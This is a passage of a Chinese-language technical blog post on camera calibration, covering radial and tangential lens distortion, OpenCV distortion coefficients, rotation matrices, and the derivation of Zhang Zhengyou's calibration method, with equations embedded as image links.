class="headerlink" title="4.0.径向畸变与切向畸变"></a>4.0.径向畸变与切向畸变</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><ul><li><p>径向畸变,就是矢量端点沿长度方向发生的变化dr,也就是矢径的变化。切向畸变,就是矢量端点沿切线方向发生的变化,也就是角度的变化dt</p></li><li><p>为什么图像畸变的描述用“径向” 和“切向”而不是用X 和Y。主要原因是用“径向” 和“切向”更好描述，在后续的标定函数中，用到的像素参数主要是 极坐标系而不是直角坐标系。</p></li></ul><h5 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h5><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20201106125849126.png" alt="image-20201106125849126"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20201106125940782.png" alt="image-20201106125940782"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20201106130012419.png" alt="image-20201106130012419"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20201106130035448.png" alt="image-20201106130035448"></p><ul><li><p>关于如何矫正，具体实现过程属于研发级别人员做的事情。应用级别的人需要了解其内部原理。<br>原理就是：通过标定图像（源自对标定板的拍照）和真实图像之间的比较。找到二者的之间的关系。<br>然后用这个关系，对拍照的畸变图像做逆运算即可。<br>××××</p></li><li><p>整个过程大致如下，<br>现实世界是没有畸变的，但是由于相机自身的问题，在拍照过程中，在相机靶面上留下的图像是畸变的。<br>然后相机内部的电子线路（或是芯片）运行逆畸变函数，将畸变的图像换成成真实的图像。最后以数字的方式<br>保存到相机内存里面，并且在相机的显示器上显示。                </p></li></ul><h4 id="4-1-径向畸变公式（3阶）"><a href="#4-1-径向畸变公式（3阶）" class="headerlink" title="4.1.径向畸变公式（3阶）"></a>4.1.径向畸变公式（3阶）</h4><p>成像仪光轴中心的畸变为0，沿着镜头半径方向向边缘移动，畸变越来越严重。畸变的数学模型可以用主点（principle  point）周围的泰勒级数展开式的前几项进行描述，通常使用前两项，即k1和k2，对于畸变很大的镜头，如鱼眼镜头，可以增加使用第三项k3来进行描述，成像仪上某点根据其在径向方向上的分布位置，调节公式为：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910103910305.png" alt="image-20200910103910305"></p><p>式里（x<sub>0</sub>，y<sub>0</sub>）是畸变点在成像仪上的归一化原始位置，（x，y）是畸变矫正后新的归一化位置，下图是距离光心不同距离上的点经过透镜径向畸变后点位的偏移示意图，可以看到，距离光心越远，径向位移越大，表示畸变也越大，在光心附近，几乎没有偏移。</p><h4 id="4-2-切向畸变公式"><a href="#4-2-切向畸变公式" class="headerlink" title="4.2.切向畸变公式"></a>4.2.切向畸变公式</h4><p>相比于径向畸变，畸变模型可以用两个额外的参数p1和p2来描述：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910105007083.png" alt="image-20200910105007083"></p><p>r是图像像素点到图像中心的距离，即 r<sup>2</sup>=x<sup>2</sup>+y<sup>2</sup></p><p><strong>相机标定的第二个目的就是获得相机的畸变参数，如上式的</strong>k<sub>1</sub>、k<sub>2</sub>、k<sub>3</sub>、p<sub>1</sub>、p<sub>2</sub><strong>等，进而方便后期对图像进行去畸变处理。</strong></p><h4 id="4-3-Mat矩阵"><a href="#4-3-Mat矩阵" class="headerlink" title="4.3.Mat矩阵"></a>4.3.Mat矩阵</h4><p>径向畸变和切向畸变模型中一共有<strong>5个畸变参数</strong>，在<strong>OpenCV</strong>中他们被排列成一个5*1的矩阵，依次包含k1、k2、p1、p2、k3，经常被定义为Mat矩阵的形式，如Mat  distCoeffs=Mat（1,5，CV_32FC1，Scalar::all（0））；这5个参数就是相机标定中需要确定的相机的5个畸变系数。求得这5个参数后，就可以校正由于镜头畸变引起的图像的变形失真，下图显示根据镜头畸变系数校正后的效果：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200910105230367.png" alt="image-20200910105230367"></p><h3 id="5-相机标定的目的到底是什么呢？"><a href="#5-相机标定的目的到底是什么呢？" class="headerlink" title="5.相机标定的目的到底是什么呢？"></a>5.相机标定的目的到底是什么呢？</h3><p>我们拿到一张照片，可以得到图中某个像素点A到另一个像素点B之间的距离是多少个像素，但是回忆一下我们上面讲的4个坐标系变换的模型，不难发现，如果只利用像素点之间的距离是无法恢复出真实的世界坐标系中的物体位置的，原因在于从相机坐标系到图像坐标系时，损失了一个维度的信息，因此仅通过像素只能够恢复到图像坐标系，从图像坐标系到相机坐标系之间还有一道鸿沟。</p><p>仅仅利用单目相机标定的结果，是无法直接从像素坐标转化到物理坐标的，因为透视投影丢失了一个维度的坐标，所以<strong>测距其实需要双目相机</strong></p><h3 id="6、张正友标定法"><a href="#6、张正友标定法" class="headerlink" title="6、张正友标定法"></a>6、张正友标定法</h3><h4 id="6-1-关于旋转矩阵的一些操作"><a href="#6-1-关于旋转矩阵的一些操作" class="headerlink" title="6.1.关于旋转矩阵的一些操作"></a>6.1.关于旋转矩阵的一些操作</h4><ul><li><p><strong>旋转矩阵R—&gt;欧拉角</strong></p><ul><li><p><strong>欧拉角</strong>就是物体绕坐标三个坐标轴旋转的角度(没有平移的三维运动：从物体坐标系-&gt;惯性坐标系)</p><p>其中,绕Z轴旋转叫作roll/bank(注意这里我们规定Z轴通常和机身方向一致而不是简单的向上(不同领域叫法不同，*ZYX和rollyawpitch没有绝对的对应关系),所谓翻滚角)、绕Y轴旋转叫作yaw/heading(这里我们规定向上,所谓偏航角)、绕X轴旋转叫作pitch(X轴通常与鸡翅方向一致,所谓俯仰角)，旋转角度分别用 <img src="https://www.zhihu.com/equation?tex=%5Calpha%E3%80%81%5Cbeta%E3%80%81%5Cgamma" alt="[公式]"> 表示，可以形象的用飞机举例如下：</p></li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911094345234.png" alt="image-20200911094345234"></p><ul><li><p> <strong>三维旋转矩阵</strong></p></li><li><p><strong>从相机坐标系到世界坐标系</strong></p><p>旋转的欧拉角按<strong>从世界坐标系转换到相机坐标系</strong>的过程，先按z轴旋转、之后y轴旋转、之后x轴旋转，最终得到相机坐标系，得到的角度分别是yaw、pitch、roll，那么从相机坐标系到世界坐标系的旋转矩阵按如下方式定义:</p></li></ul><p>  <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911095011204.png" alt="image-20200911095011204"></p><p>  <img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911095109317.png" alt="image-20200911095109317"></p><ul><li><p><strong>从世界坐标系到相机坐标系</strong></p><p>下面介绍从世界坐标系旋转到相机坐标系，这是一个正向旋转的过程，首先绕z，y，x旋转并平移T得到相机坐标系，那么从世界坐标系到与相机坐标系同向的坐标系是只经过旋转，那么旋转矩阵为RxRyRz，而此时三个维度的旋转分别是：</p></li></ul></li></ul><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911095701482.png" alt="image-20200911095701482"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911095723570.png" alt="image-20200911095723570"></p><p>其中对于z，y，x方向的旋转都是按照<strong>右手系定则</strong>，大拇指指向轴线方向，四指方向为旋转的正方向。</p><h4 id="6-2-张正友标定法的思路"><a href="#6-2-张正友标定法的思路" class="headerlink" title="6.2.张正友标定法的思路"></a>6.2.张正友标定法的思路</h4><ul><li><p>张正友标定法利用如下图所示的棋盘格标定板，在得到一张标定板的图像之后，可以利用相应的图像检测算法得到每一个角点的像素坐标 <img src="https://www.zhihu.com/equation?tex=(u,+v)" alt="[公式]"> 。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911104858304.png" alt="image-20200911104858304"></p></li><li><p>张正友标定法将世界坐标系固定于棋盘格上，则棋盘格上任一点的物理坐标 <img src="https://www.zhihu.com/equation?tex=W+=+0" alt="[公式]">，由于标定板的世界坐标系是人为事先定义好的，标定板上每一个格子的大小是已知的，我们可以计算得到每一个角点在世界坐标系下的物理坐标<img src="https://www.zhihu.com/equation?tex=(U,V,W=0)" alt="[公式]">。</p></li><li><p>我们将利用这些信息：每一个角点的像素坐标 <img src="https://www.zhihu.com/equation?tex=(u,+v)" alt="[公式]"> 、每一个角点在世界坐标系下的物理坐标<img src="https://www.zhihu.com/equation?tex=(U,V,W=0)" alt="[公式]">，来进行相机的标定，获得相机的内外参矩阵、畸变参数。</p></li><li><p>张正友标定法标定相机的内外参数的思路如下：</p><p>1）、求解内参矩阵与外参矩阵的积；</p><p>2）、求解内参矩阵；</p><p>3）、求解外参矩阵。</p></li></ul><h5 id="6-2-1-求解内参矩阵与外参矩阵的积"><a href="#6-2-1-求解内参矩阵与外参矩阵的积" class="headerlink" title="6.2.1.求解内参矩阵与外参矩阵的积"></a>6.2.1.求解内参矩阵与外参矩阵的积</h5><p>将世界坐标系固定于棋盘格上，则棋盘格上任一点的物理坐标 <img src="https://www.zhihu.com/equation?tex=W+=+0" alt="[公式]"> ，因此，原单点无畸变的成像模型可以化为下式。其中， <img src="https://www.zhihu.com/equation?tex=R1,+R2" alt="[公式]"> 为旋转矩阵 <img src="https://www.zhihu.com/equation?tex=R" alt="[公式]"> 的前两列。为了简便，将内参矩阵记为 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911105828058.png" alt="image-20200911105828058"></p><p>我们对于上式做一定的说明。对于不同的图片，内参矩阵<img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 为定值；对于同一张图片，内参矩阵<img src="https://www.zhihu.com/equation?tex=A" alt="[公式]">，外参矩阵 <img src="https://www.zhihu.com/equation?tex=(R+1+%5Cquad+R+2+%5Cquad+T)" alt="[公式]"> 为定值；对于同一张图片上的单点，内参矩阵<img src="https://www.zhihu.com/equation?tex=A" alt="[公式]">，外参矩阵 <img src="https://www.zhihu.com/equation?tex=(R+1+%5Cquad+R+2+%5Cquad+T)" alt="[公式]">，尺度因子 <img src="https://www.zhihu.com/equation?tex=Z" alt="[公式]"> 为定值。</p><p>我们将 <img src="https://www.zhihu.com/equation?tex=A(R+1+%5Cquad+R+2+%5Cquad+T)" alt="[公式]"> 记为矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> ， <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 即为内参矩阵和外参矩阵的积，记矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 的三列为 <img src="https://www.zhihu.com/equation?tex=(H1,+H2,+H3)" alt="[公式]"> ，则有：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911105935027.png" alt="image-20200911105935027"></p><p>利用上式，消去尺度因子 <img src="https://www.zhihu.com/equation?tex=Z" alt="[公式]">，可得：</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20200911105955127.png" alt="image-20200911105955127"></p><p>此时，尺度因子 <img src="https://www.zhihu.com/equation?tex=Z" alt="[公式]">已经被消去，因此<strong>上式对于同一张图片上所有的角点均成立</strong>。<img src="https://www.zhihu.com/equation?tex=(u,v)" alt="[公式]"> 是像素坐标系下的标定板角点的坐标， <img src="https://www.zhihu.com/equation?tex=(U,V)" alt="[公式]"> 是世界坐标系下的标定板角点的坐标。通过<strong>图像识别算法</strong>，我们可以得到标定板角点的像素坐标<img src="https://www.zhihu.com/equation?tex=(u,v)" alt="[公式]">，又由于标定板的世界坐标系是人为定义好的，标定板上每一个格子的大小是已知的，我们可以计算得到世界坐标系下的<img src="https://www.zhihu.com/equation?tex=(U,V)" alt="[公式]">。</p><p>由这里的 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 是<strong>齐次矩阵</strong>，有8个独立未知元素。每一个标定板角点可以提供两个约束方程（ <img src="https://www.zhihu.com/equation?tex=u,+U,+V" alt="[公式]"> 的对应关系、 <img src="https://www.zhihu.com/equation?tex=v,U,V" alt="[公式]"> 的对应关系提供了两个约束方程），因此，<strong>当一张图片上的标定板角点数量等于4时，即可求得该图片对应的矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"></strong> 。当一张图片上的标定板角点数量大于4时，利用最小二乘法回归最佳的矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]">。</p><p><em>附：Yu Mao的回答关于为什么要引入<strong>齐次方程</strong>的问题：<a href="https://www.zhihu.com/question/26655998">https://www.zhihu.com/question/26655998</a></em></p><h5 id="6-2-2-求解内参矩阵"><a href="#6-2-2-求解内参矩阵" class="headerlink" title="6.2.2.求解内参矩阵"></a>6.2.2.求解内参矩阵</h5><p>我们已知了矩阵 <img src="https://www.zhihu.com/equation?tex=H+=+A(R+1+%5Cquad+R+2+%5Cquad+T)" alt="[公式]"> ，接下来需要求解相机的内参矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 。</p><p>我们利用<img src="https://www.zhihu.com/equation?tex=R1,+R2+" alt="[公式]">作为旋转矩阵 <img src="https://www.zhihu.com/equation?tex=R" alt="[公式]"> 的两列，存在单位正交的关系，即：</p><p><img src="https://www.zhihu.com/equation?tex=R+1%5E%7BT%7D+R+2=0+%5C%5C+R+1%5E%7BT%7D+R+1=R+2%5E%7BT%7D+R+2=1" alt="[公式]"> </p><p>则由 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 和 <img src="https://www.zhihu.com/equation?tex=R1,+R2" alt="[公式]"> 的关系，可知：</p><p><img src="https://www.zhihu.com/equation?tex=R1=+A%5E%7B-1%7D+H1+%5C%5C+R+2=+A%5E%7B-1%7D+H+2" alt="[公式]"> </p><p>代入可得：</p><p><img src="https://www.zhihu.com/equation?tex=H+1%5E%7BT%7D+++A%5E%7B-T%7D+A%5E%7B-1%7D+H+2=0+%5C%5C+H+1%5E%7BT%7D++A%5E%7B-T%7D+A%5E%7B-1%7D+H+1+=+H+2%5E%7BT%7D+A%5E%7B-T%7D+A%5E%7B-1%7D+H+2=1" alt="[公式]"> </p><p>另外，我们发现，上述两个约束方程中均存在矩阵 <img src="https://www.zhihu.com/equation?tex=A%5E%7B-T%7D+A%5E%7B-1%7D" alt="[公式]"> 。因此，我们记<img src="https://www.zhihu.com/equation?tex=A%5E%7B-T%7D+A%5E%7B-1%7D+=+B" alt="[公式]"> ，则 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]">为对称阵。<strong>我们试图先求解出矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> ，通过矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> 再求解相机的内参矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 。</strong></p><p>同时，为了简便，我们记相机内参矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]"> 为： </p><p><img src="https://www.zhihu.com/equation?tex=A=%5Cleft(%5Cbegin%7Barray%7D%7Bcccc%7D%7B%5Cfrac%7Bf%7D%7Bd+X%7D%7D+&+%7B-%5Cfrac%7Bf%5Ccot+%5Ctheta%7D%7Bd+X%7D%7D+&+%7Bu_%7B0%7D%7D+&+%7B0%7D+%5C%5C+%7B0%7D+&+%7B%5Cfrac%7Bf%7D%7Bd+Y+%5Csin+%5Ctheta%7D%7D+&+%7Bv_%7B0%7D%7D+&+%7B0%7D+%5C%5C+%7B0%7D+&+%7B0%7D+&+%7B1%7D+&+%7B0%7D%5Cend%7Barray%7D%5Cright)+=+%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Calpha%7D+&+%7B%5Cgamma%7D+&+%7Bu_%7B0%7D%7D+%5C%5C+%7B0%7D+&+%7B%5Cbeta%7D+&+%7Bv_%7B0%7D%7D+%5C%5C+%7B0%7D+&+%7B0%7D+&+%7B1%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C" alt="[公式]"> </p><p>则： </p><p><img src="https://www.zhihu.com/equation?tex=A%5E%7B-1%7D=%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Cfrac%7B1%7D%7B%5Calpha%7D%7D+&+%7B-%5Cfrac%7B%5Cgamma%7D%7B%5Calpha+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B%5Cgamma+v_%7B0%7D-%5Cbeta+u_%7B0%7D%7D%7B%5Calpha+%5Cbeta%7D%7D+%5C%5C+%7B0%7D+&+%7B%5Cfrac%7B1%7D%7B%5Cbeta%7D%7D+&+%7B-%5Cfrac%7Bv_%7B0%7D%7D%7B%5Cbeta%7D%7D+%5C%5C+%7B0%7D+&+%7B0%7D+&+%7B1%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C" alt="[公式]"> </p><p>则用矩阵 <img src="https://www.zhihu.com/equation?tex=A" alt="[公式]">表示矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> 得：</p><p><img src="https://www.zhihu.com/equation?tex=B+=+A%5E%7B-T%7D+A%5E%7B-1%7D+=+%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Cfrac%7B1%7D%7B%5Calpha%5E%7B2%7D%7D%7D+&+%7B-%5Cfrac%7B%5Cgamma%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B%5Cgamma+v_%7B0%7D-%5Cbeta+u_%7B0%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+%5C%5C+%7B-%5Cfrac%7B%5Cgamma%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B1%7D%7B%5Cbeta%5E%7B2%7D%7D+%5Cfrac%7B%5Cgamma%5E%7B2%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D%7D+&+%7B%5Cfrac%7B%5Cgamma%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D-%5Cfrac%7Bv_%7B0%7D%7D%7B%5Cbeta%5E%7B2%7D%7D%7D+%5C%5C+%7B%5Cfrac%7B%5Cgamma+v_%7B0%7D-%5Cbeta+u_%7B0%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B%5Cgamma%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D-%5Cfrac%7Bv_%7B0%7D%7D%7B%5Cbeta%5E%7B2%7D%7D%7D+&+%7B%5Cfrac%7B%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%5E%7B2%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D+%5Cfrac%7Bv_%7B0%7D%5E%7B2%7D%7D%7B%5Cbeta%5E%7B2%7D%7D+1%7D%5Cend%7Barray%7D%5Cright%5D=+%5Cleft%5B%5Cbegin%7Barray%7D%7Blll%7D%7BB_%7B11%7D%7D+&+%7BB_%7B12%7D%7D+&+%7BB_%7B13%7D%7D+%5C%5C+%7BB_%7B12%7D%7D+&+%7BB_%7B22%7D%7D+&+%7BB_%7B23%7D%7D+%5C%5C+%7BB_%7B13%7D%7D+&+%7BB_%7B23%7D%7D+&+%7BB_%7B33%7D%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C" alt="[公式]"> </p><p>注意：由于<img src="https://www.zhihu.com/equation?tex=B" alt="[公式]">为对称阵，上式出现了两次 <img src="https://www.zhihu.com/equation?tex=B_%7B12%7D,+B_%7B13%7D,+B_%7B23%7D" alt="[公式]"> 。</p><p>这里，我们可以使用 <img src="https://www.zhihu.com/equation?tex=B+=+A%5E%7B-T%7D+A%5E%7B-1%7D" alt="[公式]"> 将前面通过 <img src="https://www.zhihu.com/equation?tex=R1,+R2" alt="[公式]"> 单位正交得到的约束方程化为：</p><p><img src="https://www.zhihu.com/equation?tex=H+1%5E%7BT%7D++B+H+2+=+0+%5C%5C++H+1%5E%7BT%7D+B+H+1=H+2%5E%7BT%7DB+H+2=1" alt="[公式]"> </p><p>因此，为了求解矩阵<img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> ，我们必须计算 <img src="https://www.zhihu.com/equation?tex=H_%7Bi%7D%5E%7BT%7D+B+H_%7Bj%7D" alt="[公式]"> 。则：</p><p><img src="https://www.zhihu.com/equation?tex=H_%7Bi%7D%5E%7BT%7D+B+H_%7Bj%7D=%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7BH_%7B1+i%7D%7D+&+%7BH_%7B2+i%7D%7D+&+%7BH_%7B3+i%7D%7D%5Cend%7Barray%7D%5Cright%5D%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7BB_%7B11%7D%7D+&+%7BB_%7B12%7D%7D+&+%7BB_%7B13%7D%7D+%5C%5C+%7BB_%7B12%7D%7D+&+%7BB_%7B22%7D%7D+&+%7BB_%7B32%7D%7D+%5C%5C+%7BB_%7B31%7D%7D+&+%7BB_%7B32%7D%7D+&+%7BB_%7B33%7D%7D%5Cend%7Barray%7D%5Cright%5D%5Cleft%5B%5Cbegin%7Barray%7D%7Bc%7D%7BH_%7B1+j%7D%7D+%5C%5C+%7BH_%7B2+j%7D%7D+%5C%5C+%7BH_%7B3+j%7D%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C++=+%5Cleft%5B%5Cbegin%7Barray%7D%7Bllll%7D%7BH_%7B1+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B1+i%7D+H_%7B2+j%7D+H_%7B2+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B2+i%7D+H_%7B2+j%7D%7D+&+%7BH_%7B1+i%7D+H_%7B3+j%7D+H_%7B3+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B2+i%7D+H_%7B3+j%7D+H_%7B3+i%7D+H_%7B2+j%7D%7D+&+%7BH_%7B3+i%7D+H_%7B3+j%7D%7D%5Cend%7Barray%7D%5Cright%5D+%5Cleft%5B%5Cbegin%7Barray%7D%7Bl%7D%7BB_%7B11%7D%7D+%5C%5C+%7BB_%7B12%7D%7D+%5C%5C+%7BB_%7B22%7D%7D+%5C%5C+%7BB_%7B13%7D%7D+%5C%5C+%7BB_%7B23%7D%7D+%5C%5C+%7BB_%7B33%7D%7D%5Cend%7Barray%7D%5Cright%5D" alt="[公式]"> </p><p>上述方程看起来有点复杂，但是其实不然，我们可以记：</p><p><img src="https://www.zhihu.com/equation?tex=v_%7Bi+j%7D=%5Cleft%5B%5Cbegin%7Barray%7D%7Bllll%7D%7BH_%7B1+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B1+i%7D+H_%7B2+j%7D+H_%7B2+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B2+i%7D+H_%7B2+j%7D%7D+&+%7BH_%7B1+i%7D+H_%7B3+j%7D+H_%7B3+i%7D+H_%7B1+j%7D%7D+&+%7BH_%7B2+i%7D+H_%7B3+j%7D+H_%7B3+i%7D+H_%7B2+j%7D%7D+&+%7BH_%7B3+i%7D+H_%7B3+j%7D%7D%5Cend%7Barray%7D%5Cright%5D%5E%7BT%7D+%5C%5C+b=%5Cleft%5B%5Cbegin%7Barray%7D%7Bllllll%7D%7BB_%7B11%7D%7D+&+%7BB_%7B12%7D%7D+&+%7BB_%7B22%7D%7D+&+%7BB_%7B13%7D%7D+&+%7BB_%7B23%7D%7D+&+%7BB_%7B33%7D%7D%5Cend%7Barray%7D%5Cright%5D%5E%7BT%7D" alt="[公式]"> </p><p>则上述方程化为： <img src="https://www.zhihu.com/equation?tex=H_%7Bi%7D%5E%7BT%7D+B+H_%7Bj%7D+=+v_%7Bij%7Db" alt="[公式]"> </p><p>此时，通过 <img src="https://www.zhihu.com/equation?tex=R1,+R2" alt="[公式]"> 单位正交得到的约束方程可化为：</p><p><img src="https://www.zhihu.com/equation?tex=v_%7B12%7D%5E%7BT%7D+b=0+%5C%5C+v_%7B11%7D%5E%7BT%7D+b=++v_%7B22%7D%5E%7BT%7D+b=1%5C%5C" alt="[公式]"> </p><p>即：</p><p><img src="https://www.zhihu.com/equation?tex=%5Cleft%5B%5Cbegin%7Barray%7D%7Bc%7D%7Bv_%7B12%7D%5E%7BT%7D%7D+%5C%5C+%7Bv_%7B11%7D%5E%7BT%7D-v_%7B22%7D%5E%7BT%7D%7D%5Cend%7Barray%7D%5Cright%5D+b=v+b=0+%5C%5C" alt="[公式]"> </p><p>其中，矩阵 <img src="https://www.zhihu.com/equation?tex=v=+%5Cleft%5B%5Cbegin%7Barray%7D%7Bc%7D%7Bv_%7B12%7D%5E%7BT%7D%7D+%5C%5C+%7Bv_%7B11%7D%5E%7BT%7D-v_%7B22%7D%5E%7BT%7D%7D%5Cend%7Barray%7D%5Cright%5D+" alt="[公式]"> </p><p>由于矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 已知，矩阵 <img src="https://www.zhihu.com/equation?tex=v" alt="[公式]"> 又全部由矩阵 <img src="https://www.zhihu.com/equation?tex=H" alt="[公式]"> 的元素构成，因此矩阵<img src="https://www.zhihu.com/equation?tex=v" alt="[公式]">已知。</p><p>此时，我们只要求解出向量 <img src="https://www.zhihu.com/equation?tex=b" alt="[公式]"> ，即可得到矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> 。<strong>每张标定板图片可以提供一个 <img src="https://www.zhihu.com/equation?tex=vb+=+0" alt="[公式]"> 的约束关系，该约束关系含有两个约束方程。但是，向量 <img src="https://www.zhihu.com/equation?tex=b" alt="[公式]"> 有6个未知元素</strong>。<strong>因此，单张图片提供的两个约束方程是不足以解出来向量 <img src="https://www.zhihu.com/equation?tex=b" alt="[公式]">。因此，我们只要取3张标定板照片，得到3个</strong><img src="https://www.zhihu.com/equation?tex=vb+=+0" alt="[公式]"> <strong>的约束关系，即6个方程，即可求解向量 <img src="https://www.zhihu.com/equation?tex=b" alt="[公式]">。</strong>当标定板图片的个数大于3时（事实上一般需要15到20张标定板图片），可采用最小二乘拟合最佳的向量 <img src="https://www.zhihu.com/equation?tex=b" alt="[公式]"> ，并得到矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]">。</p><p><img src="https://www.zhihu.com/equation?tex=B=%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7B%5Cfrac%7B1%7D%7B%5Calpha%5E%7B2%7D%7D%7D+&+%7B-%5Cfrac%7B%5Cgamma%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B%5Cgamma+v_%7B0%7D-%5Cbeta+u_%7B0%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+%5C%5C+%7B-%5Cfrac%7B%5Cgamma%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B1%7D%7B%5Cbeta%5E%7B2%7D%7D+%5Cfrac%7B%5Cgamma%5E%7B2%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D%7D+&+%7B%5Cfrac%7B%5Cgamma%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D-%5Cfrac%7Bv_%7B0%7D%7D%7B%5Cbeta%5E%7B2%7D%7D%7D+%5C%5C+%7B%5Cfrac%7B%5Cgamma+v_%7B0%7D-%5Cbeta+u_%7B0%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%7D%7D+&+%7B%5Cfrac%7B%5Cgamma%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D-%5Cfrac%7Bv_%7B0%7D%7D%7B%5Cbeta%5E%7B2%7D%7D%7D+&+%7B%5Cfrac%7B%5Cleft(%5Cbeta+u_%7B0%7D-%5Cgamma+v_%7B0%7D%5Cright)%5E%7B2%7D%7D%7B%5Calpha%5E%7B2%7D+%5Cbeta%5E%7B2%7D%7D+%5Cfrac%7Bv_%7B0%7D%5E%7B2%7D%7D%7B%5Cbeta%5E%7B2%7D%7D+1%7D%5Cend%7Barray%7D%5Cright%5D=%5Cleft%5B%5Cbegin%7Barray%7D%7Bccc%7D%7BB_%7B11%7D%7D+&+%7BB_%7B21%7D%7D+&+%7BB_%7B13%7D%7D+%5C%5C+%7BB_%7B21%7D%7D+&+%7BB_%7B22%7D%7D+&+%7BB_%7B23%7D%7D+%5C%5C+%7BB_%7B13%7D%7D+&+%7BB_%7B23%7D%7D+&+%7BB_%7B33%7D%7D%5Cend%7Barray%7D%5Cright%5D+%5C%5C" alt="[公式]"> </p><p>根据矩阵 <img src="https://www.zhihu.com/equation?tex=B" alt="[公式]"> 的元素和相机内参 <img src="https://www.zhihu.com/equation?tex=%5Calpha,+%5Cbeta,+%5Cgamma,+u_0,+v_0" alt="[公式]"> 的对应关系（如上式），可得到：</p><p><img 